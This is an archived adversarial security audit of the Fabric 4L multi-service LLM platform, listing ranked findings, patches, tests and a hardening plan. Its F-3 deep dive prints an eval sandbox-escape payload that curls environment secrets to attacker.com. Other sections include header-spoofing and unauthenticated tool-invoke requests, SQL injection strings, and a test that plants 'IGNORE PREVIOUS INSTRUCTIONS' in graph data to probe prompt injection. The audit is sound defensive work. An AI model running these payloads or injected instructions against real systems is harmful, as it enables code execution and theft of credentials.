---
**ARCHIVED DOCUMENT**
Archive Date: 2026-04-27
Original Location: Repository Root
Rationale: Temporal audit/assessment report - implementation complete
Modern Equivalent: See ROADMAP.md and SECURITY.md for current status
Status: Historical reference only - not actively maintained
---

# Adversarial Security Audit — Fabric 4L

**Auditor posture:** Paranoid Staff+ Security Engineer, zero trust history with codebase.
**Date:** 2026-04-27
**Scope:** All non-gitignored files in `Fabric_4L` repository.

---

## PHASE 1: BOUNDARY MAP

### Entry Points

| ID | Entry Point | Port | Auth Required | Layer |
|----|------------|------|---------------|-------|
| EP-1 | Layer 1 Ingestion API (`uvicorn src.api.main:app`) | 8001→8000 | GovernanceMiddleware | L1 |
| EP-2 | Layer 2 Extraction API | 8002→8000 | GovernanceMiddleware | L2 |
| EP-3 | Layer 3 Knowledge Graph API | 8003→8001 | GovernanceMiddleware | L3 |
| EP-4 | Layer 4 Agents API (primary gateway) | 8004→8000 | GovernanceMiddleware | L4 |
| EP-5 | Layer 5 Ground Truth API | 8005→8005 | JWT (HS256) | L5 |
| EP-6 | Layer 6 Benchmarks API | 8006→8006 | Minimal | L6 |
| EP-7 | Flower (Celery monitoring UI) | 5555 | **NONE** | L1 infra |
| EP-8 | Neo4j Browser | 7474/7687 | Neo4j auth | Infra |
| EP-9 | Grafana | 3000 | admin/admin default | Monitoring |
| EP-10 | Prometheus | 9090 | **NONE** | Monitoring |
| EP-11 | Jaeger UI | 16686 | **NONE** | Monitoring |
| EP-12 | Redis | 6379 | **NONE** | Infra |
| EP-13 | Vault (dev mode) | 8200 | root token = `root` | Secrets |
| EP-14 | PostgreSQL | 5432 | postgres/postgres | Infra |
| EP-15 | Frontend | 3000 | Client-side | UI |
| EP-16 | WebSocket (`/v1/ws`) | via EP-4 | GovernanceMiddleware | L4 |
| EP-17 | Alertmanager | 9093 | **NONE** | Monitoring |

### Privilege Boundaries

| Boundary | Mechanism | Verified |
|----------|-----------|----------|
| JWT auth | HS256, `shared/identity/jwt.py` | ✓ Expiry enforced, secret from env |
| API key auth | HMAC-SHA256, constant-time compare | ✓ `shared/identity/hashing.py` |
| RBAC | 6 roles, fine-grained permissions | ✓ `shared/identity/permissions.py` |
| X-Tenant-ID header | System role granted, **no mutual auth** | ⚠ See F-1 |
| Tenant isolation (SQL) | `TenantScopedMixin` query builder | Partial — opt-in, not enforced |
| Tenant isolation (Neo4j) | `TenantScopedCypher` query builder | Partial — opt-in, not enforced |
| Audit append-only | DB trigger blocks UPDATE/DELETE | ✓ Migration 003 |
| Container runtime | Non-root user, CAP_DROP ALL | ✓ K8s manifests |
| Network policies | Default deny-all + per-layer allow | ✓ K8s base/ |

### INVISIBLE_SCOPE (cannot verify — gitignored or absent)

| Item | Impact |
|------|--------|
| `.env` | Cannot verify actual secrets, JWT_SECRET strength |
| `k8s/secrets.yml` | Cannot verify deployed secret values |
| `k8s/envs/` overlay secrets | Cannot verify prod-specific overrides |
| Sensor registration API | Referenced in context but no sensor code found — this is a knowledge-graph/LLM platform, not a sensor fleet |
| Zeek/Wazuh integration code | No Zeek/Wazuh parsers found in repo — context-implied but absent |
| mTLS configuration | No TLS cert management found in any service code |
| OIDC provider configuration | OIDC router exists but provider config is INVISIBLE_SCOPE |

---

## 1. EXECUTIVE ASSESSMENT

**Verdict: CONDITIONALLY_READY**

The platform has a mature identity layer (JWT + API keys + RBAC + tenant isolation primitives), append-only audit with DB triggers, non-root containers with CAP_DROP ALL, default-deny network policies, and a comprehensive CI security gate pipeline (gitleaks, Trivy, SBOM, DAST). However, several high-severity gaps exist that must be resolved before production traffic.

### Top 10 Ranked Risks

1. **F-1 (P0):** `X-Tenant-ID` header grants `SYSTEM` role (all permissions) to any request — no mutual TLS or shared secret validates the caller is actually an internal service.
2. **F-2 (P0):** `/v1/tools/invoke` endpoint has **no authentication dependency** — any unauthenticated caller can execute arbitrary registered tools.
3. **F-3 (P0):** `eval()` used in `signal_quantification.py` on formula expressions with only `{"__builtins__": {}}` — bypassable via attribute access on passed-in objects.
4. **F-4 (P1):** Hardcoded `postgres:postgres` credentials in K8s celery-worker sidecar manifest and docker-compose, persisted in version control.
5. **F-5 (P1):** Grafana default credentials `admin/admin` hardcoded in docker-compose with no forced rotation.
6. **F-6 (P1):** Vault runs in dev mode with root token `root` — if this config leaks to staging/prod, total secrets compromise.
7. **F-7 (P1):** Redis has no authentication (`requirepass` absent) — any container on the bridge network has full read/write.
8. **F-8 (P1):** Flower (Celery monitoring UI) exposed on port 5555 with no authentication — reveals task queue internals, worker state, and can trigger task revocation.
9. **F-9 (P1):** CORS defaults to wildcard `*` origins when `CORS_ORIGINS` env var is unset — production deployment risk if env var is missed.
10. **F-10 (P1):** Audit `write_to_db` is fire-and-forget `BackgroundTask` that silently swallows failures — security events can be lost without the caller knowing.

### 5 Fastest Fixes (Best ROI)

1. **Add `Depends(require_authenticated)` to `invoke_tool`** — 1-line change, closes P0 unauthenticated tool execution.
2. **Add shared-secret validation to `X-Tenant-ID` resolution** — ~20 lines, closes P0 SYSTEM role bypass.
3. **Replace `eval()` with AST-based evaluator** — L3 `roi_calculation.py` already has the pattern; copy to `signal_quantification.py`.
4. **Set `FLOWER_BASIC_AUTH` env var** in docker-compose Flower service — 1-line change.
5. **Add `--requirepass` to Redis** in docker-compose and K8s — 2-line change per manifest.

### Highest-Risk Architectural Assumption

**The `X-Tenant-ID` header trust model assumes network segmentation is the sole control preventing external callers from spoofing internal service identity.** In docker-compose (flat bridge network), this is **completely unprotected** — any container can send `X-Tenant-ID` and receive `SYSTEM` role with all permissions. In K8s with NetworkPolicies it's better, but a compromised pod can still laterally escalate.

---

## 2. FINDINGS REGISTER

| Rank | Area | Severity | Impact Tags | Evidence | Fabric 4L Risk | Recommendation | Test/Gate | Effort | Confidence |
|------|------|----------|-------------|----------|----------------|----------------|-----------|--------|------------|
| F-1 | Identity | P0 | [Security] [DataPrivacy] | `shared/identity/middleware.py:253-267` | Any container on network gets SYSTEM role by sending X-Tenant-ID header | Add shared secret (`X-Service-Auth`) validated in middleware before granting SYSTEM role | `test_x_tenant_id_without_service_secret_rejected` | S | HIGH |
| F-2 | API Auth | P0 | [Security] | `layer4-agents/src/api/routes/tools.py:126-128` | Unauthenticated tool invocation — KG queries, CRM writes, ROI calculations exposed | Add `Depends(require_authenticated)` to `invoke_tool`, `list_tools`, `get_tool_schema` | `test_tools_invoke_requires_auth` | XS | HIGH |
| F-3 | Injection | P0 | [Security] | `layer3-knowledge/src/services/signal_quantification.py:446` | `eval(expression, {"__builtins__": {}}, allowed_names)` — bypassable via `().__class__.__bases__[0].__subclasses__()` on context objects | Replace with AST walker (pattern exists in `roi_calculation.py:451-504`) | `test_formula_eval_rejects_attribute_access` | S | HIGH |
| F-4 | Secrets | P1 | [Security] [HostSafety] | `k8s/base/layer1-ingestion.yml:126` | `postgres:postgres` hardcoded in K8s manifest committed to repo — not from Secret | Move to secretKeyRef; remove plaintext from manifest | `gitleaks` / `trivy-config` | S | HIGH |
| F-5 | Secrets | P1 | [Security] [Operations] | `docker-compose.yml:425-426` | `GF_SECURITY_ADMIN_PASSWORD=admin` hardcoded | Use env var from `.env`; add first-boot rotation requirement | `test_grafana_no_default_creds` | XS | HIGH |
| F-6 | Secrets | P1 | [Security] | `docker-compose.yml:489,498` | Vault dev mode with `root` token, `VAULT_DEV_ROOT_TOKEN_ID=root` | Guard with `ENVIRONMENT != production` check; document as dev-only | `test_vault_not_dev_mode_in_prod` | S | HIGH |
| F-7 | Infra | P1 | [Security] [DataPrivacy] | `docker-compose.yml:466-480` | Redis has no auth — any process on `value-fabric-network` can read/write all keys including rate-limit state, feature flags, cache | Add `--requirepass ${REDIS_PASSWORD}` command; update all `REDIS_URL` to include password | `test_redis_requires_auth` | M | HIGH |
| F-8 | Operations | P1 | [Security] [Operations] | `docker-compose.yml:370-396` | Flower exposed on 5555 with no auth — can inspect/revoke Celery tasks | Add `--basic_auth=user:password` to Flower command | `test_flower_requires_auth` | XS | HIGH |
| F-9 | API Security | P1 | [Security] | `layer4-agents/src/api/main.py:318-319` | CORS defaults to `["*"]` when `CORS_ORIGINS` is empty — production risk | Fail-closed: if `CORS_ORIGINS` not set and `ENVIRONMENT=production`, raise on startup | `test_cors_not_wildcard_in_production` | S | HIGH |
| F-10 | Audit | P1 | [TelemetryIntegrity] [Reliability] | `shared/audit/emitter.py:219-227` | `write_to_db` catches all exceptions and only logs — caller never knows audit failed | Option A: fail-closed (raise if audit write fails for security actions). Option B: emit metric + alert (current partial control) | `test_audit_write_failure_emits_metric` | M | MEDIUM |
| F-11 | Identity | P1 | [Security] | `shared/identity/middleware.py:269-283` | `ALLOW_TENANT_QUERY_PARAM` fallback grants READ_ONLY via URL query param — can be accidentally enabled in prod | Add `ENVIRONMENT` guard: block if `ENVIRONMENT=production` regardless of flag value | `test_query_param_blocked_in_production` | XS | HIGH |
| F-12 | Container | P2 | [HostSafety] | `docker-compose.yml:28-29` | `./raw-content:/app/raw-content` host mount is read-write — container compromise gives write access to host directory | Add `:ro` unless writes are required; if writes needed, restrict path | CI manifest scan | XS | HIGH |
| F-13 | Monitoring | P2 | [Security] [Operations] | `docker-compose.yml:296-314` | Prometheus exposed on 9090 with `--web.enable-lifecycle` — unauthenticated reload/shutdown | Add `--web.enable-admin-api=false`; bind to internal-only or add reverse proxy auth | `test_prometheus_lifecycle_disabled` | S | HIGH |
| F-14 | Injection | P2 | [Security] | `shared/security/middleware.py:24-31` | SQL injection regex is defense-in-depth only (documented bypass via homoglyphs, hex encoding) — but `_check_string_injections` skips strings < 50 chars with spaces | Remove short-string bypass or document it won't catch `'; DROP TABLE--` (< 50 chars) | `test_short_sqli_payloads_detected` | S | MEDIUM |
| F-15 | Observability | P2 | [Reliability] [Operations] | `docker-compose.yml:445-463` | Jaeger exposed on 4 ports (16686, 4317, 4318, 14268) with no auth — trace data contains request details | Restrict to internal network or add auth proxy | Network policy | S | HIGH |
| F-16 | Identity | P2 | [Security] | `shared/identity/middleware.py:197-209` | JWT `InvalidTokenError` returns `None` (falls through to next strategy) instead of 401 — attacker can send malformed JWT then `X-Tenant-ID` to escalate | On malformed JWT, return 401 immediately instead of falling through | `test_malformed_jwt_does_not_fallthrough` | S | MEDIUM |
| F-17 | Tenant Isolation | P2 | [DataPrivacy] | `shared/identity/isolation.py` (entire file) | `TenantScopedMixin` and `TenantScopedCypher` are opt-in helpers — no framework enforcement that all queries use them | Add CI lint rule or decorator check that every DB query in a tenant-scoped route uses `scoped_query` | `test_all_tenant_routes_use_scoped_query` | L | MEDIUM |
| F-18 | Secrets | P2 | [Security] | `.env.example:46` | `API_KEY_HMAC_SECRET=<generate-with-openssl-rand-hex-32>` placeholder could be deployed as-is | Startup validation: reject placeholder values | `test_hmac_secret_not_placeholder` | XS | HIGH |
| F-19 | API Security | P2 | [Security] | `layer4-agents/src/api/main.py:343-344` | `allow_methods=["*"]` and `allow_headers=["*"]` — overly permissive even with restricted origins | Restrict to actual methods/headers used | Config change | XS | MEDIUM |
| F-20 | Reliability | P2 | [Reliability] | `docker-compose.yml:196` | L4 healthcheck imports `requests` at check time — if requests is missing from venv, healthcheck always fails with no useful error | Use `curl` like other layers or `httpx` which is already a dependency | Dockerfile change | XS | HIGH |
| F-21 | Supply Chain | P3 | [Security] | All Dockerfiles | Base images use pinned SHA digests (good) but `COPY --from=ghcr.io/astral-sh/uv:0.11.6` has no digest pin | Pin uv image by digest | Dockerfile change | XS | MEDIUM |
| F-22 | Operations | P3 | [Operations] | `docker-compose.yml:364-365` | Celery Beat healthcheck is `os.kill(1, 0)` — only checks PID 1 is alive, not that beat is scheduling | Replace with proper beat liveness check | Docker change | S | MEDIUM |
| F-23 | Maintainability | P3 | [Maintainability] | `docker-compose.yml:1` | `version: "3.8"` is deprecated in modern Docker Compose | Remove `version` key | XS | HIGH |

---

## 3. P0/P1 DEEP DIVES

### F-1 (P0): X-Tenant-ID Header Grants SYSTEM Role Without Mutual Authentication

**What I found:** `GovernanceMiddleware._resolve_identity()` at `shared/identity/middleware.py:253-267` accepts any `X-Tenant-ID` header value as a UUID and immediately grants the `SYSTEM` role with **all permissions** — no shared secret, mTLS, or source-IP validation.

**Why it matters for Fabric 4L:** In docker-compose, all services share `value-fabric-network`. Any compromised container (or any process that can reach port 8000-8006) can send `X-Tenant-ID: <victim-tenant-uuid>` and operate with full SYSTEM privileges — reading/writing any tenant's knowledge graph, triggering workflows, and accessing audit data.

**Exploit scenario:** Attacker compromises the `layer6-benchmarks` container (minimal security posture, no auth). Sends `curl -H "X-Tenant-ID: <target>" http://layer4-agents:8000/v1/workflows` — receives SYSTEM role, can create/delete workflows, read business cases, export documents, all for any tenant.

**Minimal patch:**
```diff
--- a/packages/shared/src/value_fabric/shared/identity/middleware.py
+++ b/packages/shared/src/value_fabric/shared/identity/middleware.py
@@ -252,6 +252,14 @@ class GovernanceMiddleware(BaseHTTPMiddleware):
         # 3. X-Tenant-ID (service-to-service)
         x_tenant = request.headers.get("X-Tenant-ID")
         if x_tenant:
+            # Require a shared service secret to prevent spoofing
+            expected_secret = os.getenv("SERVICE_AUTH_SECRET")
+            if not expected_secret:
+                logger.warning("X-Tenant-ID rejected: SERVICE_AUTH_SECRET not configured")
+                return None
+            provided_secret = request.headers.get("X-Service-Auth", "")
+            if not hmac.compare_digest(provided_secret, expected_secret):
+                logger.warning("X-Tenant-ID rejected: invalid X-Service-Auth")
+                return None
             try:
                 tenant_id = UUID(x_tenant)
             except ValueError:
```

**Regression test:** `test_x_tenant_id_without_service_secret_rejected` — Send request with `X-Tenant-ID` but no `X-Service-Auth` → expect 401 or no context. Send with valid secret → expect SYSTEM context.

**CI/CD gate:** Integration test in `tests/security/` that validates SYSTEM role is never granted without the shared secret.

**Confidence:** HIGH — directly observed in source code.

---

### F-2 (P0): `/v1/tools/invoke` Has No Authentication

**What I found:** `layer4-agents/src/api/routes/tools.py:126-128` — the `invoke_tool` endpoint has `Depends(get_tool_registry)` but **no** `Depends(require_authenticated)` or any auth dependency. Same for `list_tools` (line 71) and `get_tool_schema` (line 104).

**Why it matters for Fabric 4L:** Tools include `QueryGraphTool`, `SemanticSearchTool`, `UpdateOpportunityTool`, `CalculateROITool`, `SendNotificationTool`, `ExportToCRMTool` — unauthenticated access to these means arbitrary KG reads, CRM writes, and notification sends without identity or audit trail.

**Exploit scenario:** Attacker sends `POST /v1/tools/invoke {"tool_name": "query_graph", "input_data": {"query": "MATCH (n) RETURN n LIMIT 1000"}}` — no auth required, receives full KG data.

**Minimal patch:**
```diff
--- a/services/layer4-agents/src/api/routes/tools.py
+++ b/services/layer4-agents/src/api/routes/tools.py
@@ -69,7 +69,9 @@ def get_executor() -> WorkflowExecutor:
 @router.get("/tools", response_model=list[ToolListResponse])
 async def list_tools(
     category: str | None = None,
     search: str | None = None,
     registry: ToolRegistry = Depends(get_tool_registry),
+    ctx: RequestContext = Depends(require_authenticated),
 ) -> list[ToolListResponse]:

@@ -103,6 +105,7 @@ async def get_tool_schema(
     tool_name: str, registry: ToolRegistry = Depends(get_tool_registry)
+    ctx: RequestContext = Depends(require_authenticated),
 ) -> dict[str, Any]:

@@ -126,6 +129,7 @@ async def invoke_tool(
     request: ToolInvokeRequest, registry: ToolRegistry = Depends(get_tool_registry)
+    ctx: RequestContext = Depends(require_authenticated),
 ) -> ToolInvokeResponse:
```

**Regression test:** `test_tools_invoke_requires_auth` — `POST /v1/tools/invoke` without Bearer token → 401. With valid token → 200.

**CI/CD gate:** `grep -r "def invoke_tool\|def list_tools\|def get_tool_schema" --include="*.py" | grep -v require_authenticated` → fail if match.

**Confidence:** HIGH — directly observed, no `require_authenticated` in function signature.

---

### F-3 (P0): `eval()` in Signal Quantification Service

**What I found:** `layer3-knowledge/src/services/signal_quantification.py:446` calls `eval(expression, {"__builtins__": {}}, allowed_names)`. While `__builtins__` is empty, this is bypassable — objects in `allowed_names` can still have `.__class__.__bases__[0].__subclasses__()` chains.

**Why it matters for Fabric 4L:** Formula expressions come from user-facing signal quantification flows. An attacker who can craft a formula expression can escape the sandbox and execute arbitrary Python code on the Layer 3 container.

**Exploit scenario:** Submit formula: `[x for x in ().__class__.__bases__[0].__subclasses__() if 'warning' in str(x)][0]._module.__builtins__['__import__']('os').system('curl attacker.com/exfil?data=$(env)')` — exfiltrates environment variables including `NEO4J_PASSWORD`, `OPENAI_API_KEY`.

**Minimal patch:** Replace `eval()` with the AST-based evaluator already implemented in `roi_calculation.py:451-504`:

```diff
--- a/services/layer3-knowledge/src/services/signal_quantification.py
+++ b/services/layer3-knowledge/src/services/signal_quantification.py
@@ -438,12 +438,10 @@ class SignalQuantificationService:
         if expression in context:
             return float(context[expression])

-        # Try basic arithmetic
+        # AST-based safe evaluation (no eval())
         try:
-            allowed_names = {
-                **self.SAFE_FUNCTIONS,
-                **{k: v for k, v in context.items() if isinstance(v, (int, float))},
-            }
-            return eval(expression, {"__builtins__": {}}, allowed_names)
+            import ast
+            tree = ast.parse(expression, mode="eval")
+            return self._eval_node(tree.body, {**self.SAFE_FUNCTIONS, **{k: v for k, v in context.items() if isinstance(v, (int, float))}})
         except Exception as e:
```

(Add `_eval_node` method matching the pattern in `roi_calculation.py`.)

**Regression test:** `test_formula_eval_rejects_attribute_access` — Submit `().__class__.__bases__` as expression → expect `NameError` or `ValueError`, not arbitrary code execution.

**CI/CD gate:** `semgrep --config=p/dangerous-python-functions` — flag any `eval()` call outside test files.

**Confidence:** HIGH — `eval()` call directly observed; bypass technique is well-documented.

---

### F-4 (P1): Hardcoded Postgres Credentials in K8s Manifest

**What I found:** `k8s/base/layer1-ingestion.yml:126` contains `postgresql://postgres:postgres@postgres:5432/ingestion` as a plaintext environment variable in the celery-worker sidecar, committed to version control.

**Why it matters:** Anyone with repo read access (including CI logs, forks, former employees) has the database credentials. The main API container correctly uses `secretKeyRef` but the sidecar bypasses this pattern.

**Minimal patch:**
```diff
--- a/k8s/base/layer1-ingestion.yml
+++ b/k8s/base/layer1-ingestion.yml
@@ -124,7 +124,9 @@ spec:
           env:
             - name: DATABASE_URL
-              value: "postgresql://postgres:postgres@postgres:5432/ingestion"
+              valueFrom:
+                secretKeyRef:
+                  name: layer1-db-credentials
+                  key: DATABASE_URL
```

**Confidence:** HIGH.

---

### F-7 (P1): Redis Has No Authentication

**What I found:** `docker-compose.yml:466-480` — Redis container has no `--requirepass` and no ACL configuration. `REDIS_URL` across all services is `redis://redis:6379/0` with no password component.

**Why it matters:** Redis stores rate-limit counters, feature flags, Celery task broker data, and cached search results. An attacker on the docker network can `KEYS *`, `FLUSHALL`, or manipulate rate-limit keys to bypass throttling.

**Minimal patch:**
```diff
--- a/docker-compose.full.yml
+++ b/docker-compose.full.yml
@@ -466,6 +466,7 @@ services:
   redis:
     image: redis:7-alpine
     container_name: value-fabric-redis
+    command: redis-server --requirepass ${REDIS_PASSWORD:?REDIS_PASSWORD is required}
     ports:
       - "6379:6379"
```
Then update all `REDIS_URL` to `redis://:${REDIS_PASSWORD}@redis:6379/0`.

**Confidence:** HIGH.

---

### F-8 (P1): Flower Exposed Without Authentication

**What I found:** `docker-compose.yml:376` — Flower command is `celery -A src.shared.tasks flower --port=5555` with no `--basic_auth` flag. Port 5555 is published to host.

**Minimal patch:**
```diff
-    command: celery -A src.shared.tasks flower --port=5555
+    command: celery -A src.shared.tasks flower --port=5555 --basic_auth=${FLOWER_USER:-admin}:${FLOWER_PASSWORD:?FLOWER_PASSWORD is required}
```

**Confidence:** HIGH.

---

## 4. PATCH SUGGESTIONS

All patches are provided inline in the P0/P1 Deep Dives above (Section 3). Summary:

| Finding | Patch Type | Exact Location |
|---------|-----------|----------------|
| F-1 | Add `X-Service-Auth` header check | `shared/identity/middleware.py:253` |
| F-2 | Add `Depends(require_authenticated)` | `layer4-agents/src/api/routes/tools.py:71,104,128` |
| F-3 | Replace `eval()` with AST walker | `layer3-knowledge/src/services/signal_quantification.py:440-446` |
| F-4 | Move to `secretKeyRef` | `k8s/base/layer1-ingestion.yml:126` |
| F-5 | Use env var for Grafana password | `docker-compose.yml:426` |
| F-7 | Add `--requirepass` to Redis | `docker-compose.yml:468` |
| F-8 | Add `--basic_auth` to Flower | `docker-compose.yml:376` |
| F-9 | Fail-closed CORS in production | `layer4-agents/src/api/main.py:318-326` |

---

## 5. TESTS TO ADD

| Area | Test Name | Level | Attack/Failure Simulated | Acceptance Criteria | Priority |
|------|-----------|-------|--------------------------|---------------------|----------|
| Auth Bypass | `test_tools_invoke_requires_auth` | Unit | Unauthenticated POST /v1/tools/invoke | Returns 401 | P0 |
| Auth Bypass | `test_tools_list_requires_auth` | Unit | Unauthenticated GET /v1/tools | Returns 401 | P0 |
| Identity Spoofing | `test_x_tenant_id_without_service_secret_rejected` | Integration | X-Tenant-ID header without X-Service-Auth | No SYSTEM role granted | P0 |
| Identity Spoofing | `test_x_tenant_id_with_valid_service_secret_accepted` | Integration | X-Tenant-ID + valid X-Service-Auth | SYSTEM role granted | P0 |
| Injection | `test_formula_eval_rejects_attribute_access` | Unit | `().__class__.__bases__` as formula expression | Raises error, no code exec | P0 |
| Injection | `test_formula_eval_rejects_import` | Unit | `__import__('os')` as formula expression | Raises error | P0 |
| Tenant Isolation | `test_cross_tenant_kg_query_blocked` | Integration | Tenant A queries Tenant B's KG nodes | Returns empty or 403 | P1 |
| Tenant Isolation | `test_cross_tenant_workflow_access_blocked` | Integration | Tenant A reads Tenant B's workflow | Returns 403 | P1 |
| Audit Integrity | `test_audit_write_failure_emits_metric` | Unit | Mock DB to raise on INSERT | Prometheus counter incremented | P1 |
| Audit Integrity | `test_audit_trigger_blocks_update` | Integration | `UPDATE audit_events SET action='x'` | Raises DB exception | P1 |
| Auth Fallthrough | `test_malformed_jwt_does_not_fallthrough_to_header` | Unit | Send malformed JWT + X-Tenant-ID | Returns 401, not SYSTEM | P1 |
| CORS | `test_cors_not_wildcard_in_production` | Unit | `ENVIRONMENT=production` + no `CORS_ORIGINS` | Startup raises or origins restricted | P1 |
| Secrets | `test_hmac_secret_not_placeholder` | Unit | `API_KEY_HMAC_SECRET=<generate...>` | Startup raises validation error | P2 |
| Container | `test_no_privileged_containers_in_k8s` | CI | Scan all K8s manifests for `privileged: true` | Zero matches | P2 |
| Injection | `test_short_sqli_payloads_detected` | Unit | `'; DROP TABLE users--` (< 50 chars) | Detected by SecurityMiddleware | P2 |
| E2E Smoke | `test_fresh_deployment_reaches_healthy` | E2E | `docker compose up` → all healthchecks pass | All services healthy within 5min | P1 |
| Redis Auth | `test_redis_rejects_unauthenticated_connection` | Integration | Connect to Redis without password | Connection refused | P1 |
| LLM Safety | `test_prompt_injection_via_kg_content` | Integration | Store `IGNORE PREVIOUS INSTRUCTIONS` in KG node, trigger agent | Agent response does not follow injected instruction | P2 |

---

## 6. CI/CD GATES (merge-blocking)

| Gate Name | Tool/Implementation | What Failure Looks Like | Prevents Regression Of |
|-----------|--------------------|-----------------------|----------------------|
| Static Type Check | `mypy --strict` per layer | Type error in PR diff | General correctness |
| Lint + Security Rules | `ruff check --select B,S` + `semgrep --config=p/dangerous-python-functions` | `eval()`, `exec()`, `subprocess.call(shell=True)` flagged | F-3 |
| Unit Test Suite | `pytest --cov-fail-under=80` | Coverage below 80% | All findings |
| Auth Enforcement Lint | `grep` for route handlers missing `require_authenticated` | Route without auth dependency | F-2 |
| Secret Detection | `gitleaks` (already in `security-gates.yml`) | Committed secret detected | F-4, F-5 |
| SAST | CodeQL + Trivy (already in `security-gates.yml`) | High/Critical vulnerability | Supply chain |
| Container Scan | Trivy image scan (already in `security-gates.yml`) | HIGH/CRITICAL CVE | Container safety |
| SBOM + Provenance | CycloneDX generation (already in `security-gates.yml`) | Missing SBOM | Supply chain |
| K8s Manifest Scan | `trivy config` or `checkov -d k8s/` | Hardcoded credentials, privileged containers | F-4, F-12 |
| Hardcoded Credential Scan | `grep -r 'postgres:postgres\|admin:admin\|root:root' k8s/ docker-compose.yml` | Match found | F-4, F-5 |
| Audit Regression Test | `pytest tests/audit/test_immutability.py` | UPDATE/DELETE on audit_events succeeds | Audit integrity |
| Integration Test (Ingestion) | `pytest tests/integration/test_ingestion_pipeline.py` | Pipeline failure | Data flow correctness |
| E2E Smoke | `docker compose up --wait && curl healthchecks` | Any service unhealthy | F-20 |
| CORS Policy Check | Startup assertion in `main.py` | Wildcard CORS in production | F-9 |

---

## 7. PRODUCTION READINESS CHECKLIST

### Security Boundaries

- [ ] All admin/API/gateway/dashboard routes enforce authentication — **F-2: `/v1/tools/invoke`, `/v1/tools`, `/v1/tools/{name}` lack auth**
- [x] Authorization enforced at every resource boundary (not just route level) — RBAC permissions checked at dependency level
- [ ] No client-supplied identity is trusted without server-side validation — **F-1: `X-Tenant-ID` header grants SYSTEM role without mutual auth**
- [ ] Secrets do not exist in repo — **F-4: `postgres:postgres` in K8s manifest; F-5: `admin/admin` in docker-compose**
- [ ] Default credentials disabled on first boot — **F-5: Grafana `admin/admin`; F-6: Vault `root` token**
- [ ] SSRF, command injection, SQL/NoSQL injection, template injection, XSS covered by adversarial tests — **F-3: `eval()` bypass; F-14: short-string bypass in SecurityMiddleware**

### Host/Container Safety

- [x] No container runs `--privileged` — verified in K8s and Dockerfiles
- [x] Docker socket is never mounted into a container that processes untrusted data
- [ ] Host mounts are read-only — **F-12: `./raw-content:/app/raw-content` is read-write**
- [x] Linux capabilities dropped to minimal set (`CAP_DROP ALL`) — verified in K8s manifests
- [x] seccomp profile is `RuntimeDefault` — verified in K8s pod specs
- [x] Resource limits defined in all K8s pod specs

### Telemetry Integrity

- [x] Every event has: stable ID, source identity, timestamp with timezone, schema version — `AuditEvent` model covers this
- [ ] Parser/decoder failures emit visible error (not silent drop) — UNVERIFIED for ingestion pipeline parsers
- [ ] Backpressure behavior defined and tested — ABSENT: No backpressure tests found
- [ ] Dead-letter/replay strategy exists — ABSENT: No DLQ configuration found
- [ ] Sensor-to-server traffic is authenticated and encrypted — INVISIBLE_SCOPE: No sensor code found
- [x] Raw evidence vs normalized vs enriched clearly distinguishable — audit model separates layers

### Audit and Non-Repudiation

- [x] Security-relevant actions emit audit record — `emit_audit_event` called from routes
- [x] Audit log storage is append-only (DB trigger enforced) — verified migration 003
- [x] Audit records include: actor, action, target, timestamp, result, correlation ID
- [ ] Retention and rotation policy defined — **Documented as 7yr in migration comment but no archival mechanism implemented**
- [ ] Audit system failures fail closed — **F-10: write_to_db silently swallows failures**

### LLM/Agent Safety

- [ ] Tool calls use strict allowlist — Partial: `ToolRegistry` validates tool name exists, but no per-role tool restriction
- [ ] Destructive actions require human approval — ABSENT: No approval checkpoint in `registry.execute()`
- [ ] Prompt injection via logs/events tested — ABSENT: No prompt injection tests found
- [ ] Sensitive fields redacted before LLM context — ABSENT: No redaction layer before LLM calls observed
- [ ] AI-generated findings link to raw evidence — Partial: provenance manifest exists for exports
- [ ] Agent decisions emit auditable record — Partial: `AUDIT_LEDGER_MODE=enabled` flag exists but opt-in

### Reliability and Operations

- [x] Health, readiness, and liveness probes exist for all long-running components
- [x] Runbooks exist (`RUNBOOK.md`)
- [x] Metrics expose ingestion rate, failure rate, queue depth
- [ ] Alerts configured for ingestion stall, parser crash, auth failure spike — Partial: alert rules exist but **UNVERIFIED** coverage
- [ ] Backup/restore tested — ABSENT: No backup test found

### Testing Maturity

- [ ] Negative security tests exist — **F-2, F-3 gaps show adversarial inputs not tested**
- [ ] Tenant/workspace isolation tested at API and data layer — ABSENT at API layer
- [ ] Integration tests cover full ingestion pipeline — Partial
- [ ] E2E smoke test validates fresh deployment — Partial: `smoke-gate.yml` exists
- [x] CI blocks merge on P0/P1 regression — `pr-checks.yml` + `security-gates.yml`
- [ ] Flaky tests tracked — UNVERIFIED

---

## 8. 4-WEEK HARDENING PLAN

| Week | Theme | Target Components | Deliverables | Risks Reduced | Success Criteria |
|------|-------|-------------------|-------------|---------------|-----------------|
| 1 | **P0 Patch Sprint** | `shared/identity/middleware.py`, `layer4-agents/src/api/routes/tools.py`, `layer3-knowledge/src/services/signal_quantification.py` | F-1 mutual auth patch, F-2 auth dependency, F-3 eval→AST replacement, regression tests for all three | F-1 (SYSTEM role bypass), F-2 (unauth tool exec), F-3 (RCE via eval) | All 3 P0 tests pass; `semgrep` gate blocks `eval()` in CI |
| 2 | **Credential Hardening** | `docker-compose.yml`, `k8s/base/`, Redis, Grafana, Flower, Vault | F-4 secretKeyRef migration, F-5 Grafana env var, F-7 Redis requirepass, F-8 Flower auth, F-6 Vault guard, F-9 CORS fail-closed | F-4 through F-9 (credential exposure, unauth services) | `gitleaks` + `grep` CI gate passes; Redis/Flower/Grafana require auth |
| 3 | **Tenant Isolation + Audit** | `shared/identity/isolation.py`, `shared/audit/emitter.py`, all layer routes | F-10 audit fail-closed for security actions, F-11 query-param guard, F-16 JWT fallthrough fix, F-17 tenant isolation lint, cross-tenant integration tests | F-10 (audit gaps), F-11 (query param bypass), F-16 (auth fallthrough), F-17 (isolation enforcement) | Cross-tenant test suite passes; audit write failure triggers alert |
| 4 | **LLM Safety + Observability** | `layer4-agents/src/tools/`, monitoring stack, alert rules | Per-role tool allowlists, prompt injection test suite, sensitive field redaction before LLM context, Prometheus/Jaeger auth, backup/restore test | LLM prompt injection, monitoring auth, data recovery | Prompt injection tests pass; monitoring endpoints require auth; backup/restore documented and tested |

---

## INVISIBLE_SCOPE Summary

These items could not be fully analyzed due to `.gitignore` restrictions or absence in the codebase:

1. **`.env` files** — Cannot verify actual secret strength (JWT_SECRET length, NEO4J_PASSWORD complexity)
2. **`k8s/secrets.yml`** — Cannot verify deployed secret values
3. **Zeek/Wazuh integration** — Referenced in audit context but no parser/ingestion code found in repo
4. **Sensor fleet management** — No sensor registration, fleet deployment, or host agent code exists
